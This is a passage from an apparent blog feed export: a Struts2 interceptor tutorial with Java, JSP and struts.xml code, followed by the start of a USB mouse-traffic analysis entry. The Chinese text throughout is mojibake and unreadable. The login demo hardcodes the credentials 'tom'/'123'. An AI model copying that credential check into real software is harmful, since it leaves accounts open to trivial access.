class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> cn.itcast.domain.User;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ModelDriven;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ModelDriven</span>&lt;<span class="hljs-title">User</span>&gt; </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-keyword">private</span> User user = <span class="hljs-keyword">new</span> User();<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getModel</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> user;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//è·å–ActionContext</span><br>ActionContext actionContext = ActionContext.getContext();<br>System.out.println(user);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;tom&quot;</span>.equals(user.getUsername())<br>&amp;&amp; <span class="hljs-string">&quot;123&quot;</span>.equals(user.getPassword())) &#123;<br><span class="hljs-comment">// å°†ç”¨æˆ·å­˜å‚¨åœ¨sessionä¸­</span><br>actionContext.getSession().put(<span class="hljs-string">&quot;user&quot;</span>, user);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®&quot;</span>);<br><span class="hljs-keyword">return</span> INPUT;<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>BookAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-meta">@SuppressWarnings(&quot;serial&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">del</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book del&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PrivilegeInterceptor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.interceptor;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionInvocation;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.interceptor.AbstractInterceptor;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrivilegeInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractInterceptor</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext actionContext = invocation.getInvocationContext();<span class="hljs-comment">// å¾—åˆ°ActionContext.</span><br>Object user = actionContext.getSession().get(<span class="hljs-string">&quot;user&quot;</span>);<span class="hljs-comment">//è·å–userå¯¹è±¡</span><br><span class="hljs-keyword">if</span> (user != <span class="hljs-keyword">null</span>) &#123;<br><span class="hljs-keyword">return</span> invocation.invoke(); <span class="hljs-comment">// ç»§ç»­å‘ä¸‹æ‰§è¡Œ</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;æ‚¨è¿˜æœªç™»å½•ï¼Œè¯·å…ˆç™»å½•&quot;</span>);<br><span class="hljs-keyword">return</span> Action.LOGIN; <span class="hljs-comment">//å¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œè¿”å›loginå€¼</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>$&#123;requestScope.msg&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>ç”¨æˆ·å:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>å¯†ç :<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ç™»å½•&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>main.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_del&quot;</span>&gt;</span>book del<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æˆåŠŸé¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>ç”¨æˆ·$&#123;user.username&#125;æ“ä½œæˆåŠŸ<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- å£°æ˜æ‹¦æˆªå™¨ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span> </span><br><span class="hljs-tag">             <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.interceptor.PrivilegeInterceptor&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-comment">&lt;!-- ç”¨æˆ·ç™»å½•æ“ä½œ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-comment">&lt;!-- å…³äºbookæ“ä½œ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;book_*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å‘å¸ƒé¡¹ç›®ï¼Œè®¿é—®main.jsp<br><img src="https://img-blog.csdnimg.cn/20210416221426697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»è¿æ¥ï¼Œç”±äºæ²¡æœ‰ç™»é™†ï¼Œæ‰€ä»¥æ²¡æœ‰æƒé™ï¼Œé¡µé¢è·³è½¬åˆ°ç™»å½•é¡µé¢è¦æ±‚ç”¨æˆ·ç™»å½•ã€‚<br><img src="https://img-blog.csdnimg.cn/20210416221438400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç™»é™†æˆåŠŸåç‚¹å‡»é“¾æ¥ï¼Œè·³è½¬æˆåŠŸé¡µé¢ï¼Œæç¤ºç”¨æˆ·æ“ä½œæˆåŠŸã€‚<br><img src="https://img-blog.csdnimg.cn/20210416222502828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯¹æ¯”å¯çŸ¥æ‹¦æˆªå™¨æˆåŠŸæ‰§è¡Œ</p><p>ä»¥ä¸Šæ¡ˆä¾‹ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ªæ–¹æ³•è¿‡æ»¤å™¨PrivilegeInterceptorï¼Œåœ¨struts.xmlä¸­é…ç½®äº†è¯¥æ‹¦æˆªå™¨ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»é™†ï¼Œå°†æ— æ³•å¯¹é¡µé¢é“¾æ¥è¿›è¡Œç›¸åº”æ“ä½œï¼Œåªæœ‰ç™»é™†åçš„ç”¨æˆ·æ‰æœ‰æƒé™æ“ä½œé¡µé¢ç›¸åº”åŠŸèƒ½ã€‚</p><h2 id="æ‹¦æˆªå™¨å·¥ä½œåŸç†"><a href="#æ‹¦æˆªå™¨å·¥ä½œåŸç†" class="headerlink" title="æ‹¦æˆªå™¨å·¥ä½œåŸç†"></a>æ‹¦æˆªå™¨å·¥ä½œåŸç†</h2><p><strong>æ‹¦æˆªå™¨çš„æ‰§è¡Œé¡ºåº</strong><br>invocation.invoke()æ–¹æ³•æ˜¯æ‹¦æˆªå™¨æ¡†æ¶çš„å®ç°æ ¸å¿ƒï¼Œé€šè¿‡ç¡®å®šinvocation.invoke()æ–¹æ³•æ‰§è¡Œä½ç½®ï¼Œæ¥å®ç°Actionæ‰§è¡Œå‰åå¤„ç†æ“ä½œï¼Œåœ¨invocation.invoke()æ–¹æ³•ä¹‹å‰çš„ä»£ç å°†ä¾æ®é…ç½®ä¸­æ‹¦æˆªå™¨é¡ºåºä¾æ¬¡æ‰§è¡Œï¼Œç›´åˆ°èµ°å®Œæ‹¦æˆªå™¨åå†æ‰§è¡Œinvocation.invoke()æ–¹æ³•è°ƒç”¨Actionï¼Œç„¶åå†ä¾æ®é…ç½®ä¸­æ‹¦æˆªå™¨é¡ºåºåå‘æ‰§è¡Œinvocation.invoke()æ–¹æ³•åçš„ä»£ç ï¼Œç›´åˆ°èµ°å®Œæ‹¦æˆªå™¨</p><p><strong>æ‹¦æˆªå™¨çš„å·¥ä½œåŸç†</strong><br>å¦‚å›¾æ‰€ç¤º<br><img src="https://img-blog.csdnimg.cn/2021042220560043.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¯ä¸€ä¸ªActionè¯·æ±‚éƒ½åŒ…è£…åœ¨ä¸€ç³»åˆ—çš„æ‹¦æˆªå™¨çš„å†…éƒ¨ã€‚æ‹¦æˆªå™¨å¯ä»¥åœ¨Actionæ‰§è¡Œç›´çº¿åšç›¸ä¼¼çš„æ“ä½œä¹Ÿå¯ä»¥åœ¨Actionæ‰§è¡Œç›´ååšå›æ”¶æ“ä½œã€‚</p><p>æ¯ä¸€ä¸ªActionæ—¢å¯ä»¥å°†æ“ä½œè½¬äº¤ç»™ä¸‹é¢çš„æ‹¦æˆªå™¨ï¼ŒActionä¹Ÿå¯ä»¥ç›´æ¥é€€å‡ºæ“ä½œè¿”å›å®¢æˆ·æ—¢å®šçš„ç”»é¢ã€‚</p><p><a href="https://www.cnblogs.com/yw-ah/p/5761235.html">https://www.cnblogs.com/yw-ah/p/5761235.html</a><br><a href="https://www.cnblogs.com/wkrbky/p/5894315.html">https://www.cnblogs.com/wkrbky/p/5894315.html</a><br><a href="https://blog.csdn.net/weixin_42529699/article/details/81354355">https://blog.csdn.net/weixin_42529699/article/details/81354355</a><br><a href="https://www.imooc.com/learn/450">https://www.imooc.com/learn/450</a></p>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹å¼€å‘</category>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>USBæµé‡åˆ†æ</title>
    <link href="/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šUSBæµé‡åˆ†æ</p> <a id="more"></a><h2 id="é¼ æ ‡æµé‡"><a href="#é¼ æ ‡æµé‡" class="headerlink" title="é¼ æ ‡æµé‡"></a>é¼ æ ‡æµé‡</h2><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>USBåè®®é¼ æ ‡æ•°æ®éƒ¨åˆ†åœ¨Leftover Capture DataåŸŸä¸­ï¼Œæ•°æ®é•¿åº¦ä¸ºå››ä¸ªå­—èŠ‚</p><p>ç¬¬ä¸€ä¸ªå­—èŠ‚,ä»£è¡¨æŒ‰é”®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">å½“å–0Ã—00æ—¶,ä»£è¡¨æ²¡æœ‰æŒ‰é”®<br>å½“å–0Ã—01æ—¶,ä»£è¡¨æŒ‰å·¦é”®<br>å½“å–0Ã—02æ—¶,ä»£è¡¨å½“å‰æŒ‰é”®ä¸ºå³é”®<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå­—èŠ‚,å¯çœ‹ä½œä¸ºsigned byteç±»å‹ï¼Œå…¶æœ€é«˜ä½ä¸ºç¬¦å·ä½ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">å½“å€¼ä¸ºæ­£æ—¶ï¼Œä»£è¡¨é¼ æ ‡å³ç§»åƒç´ ä½ï¼›<br>å€¼ä¸ºè´Ÿæ—¶ï¼Œä»£è¡¨é¼ æ ‡å·¦ç§»åƒç´ ä½ã€‚<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰ä¸ªå­—èŠ‚,ä»£è¡¨å‚ç›´ä¸Šä¸‹ç§»åŠ¨çš„åç§»ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">å½“å€¼ä¸ºæ­£æ—¶ï¼Œä»£è¡¨é¼ æ ‡ä¸Šç§»åƒç´ ä½ï¼›<br>å€¼ä¸ºè´Ÿæ—¶ï¼Œä»£è¡¨é¼ æ ‡ä¸‹ç§»åƒç´ ä½ã€‚<br></code></pre></td></tr></table></figure><h3 id="å®æˆ˜ç»ƒä¹ "><a href="#å®æˆ˜ç»ƒä¹ " class="headerlink" title="å®æˆ˜ç»ƒä¹ "></a>å®æˆ˜ç»ƒä¹ 